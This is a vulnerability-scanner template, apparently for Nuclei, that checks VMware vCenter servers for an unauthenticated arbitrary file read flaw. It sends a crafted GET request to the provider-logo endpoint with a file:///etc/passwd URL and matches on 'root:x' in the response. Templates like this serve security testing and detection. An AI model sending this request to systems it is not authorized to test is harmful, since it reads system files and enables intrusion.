id: vmware-vcenter7-lfi-linux

info:
  name: VMware vCenter(<7.0.2.00100) Unauthenticated Arbitrary File Read
  author: Unknow
  severity: high
  reference:
    - https://github.com/l0ggg/VMware_vCenter
    - https://twitter.com/HackerGautam/status/1466064370081755145
  tags: vmware,lfi

requests:
  - raw:
      - |
        GET /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root:x"

      - type: status
        status:
          - 200
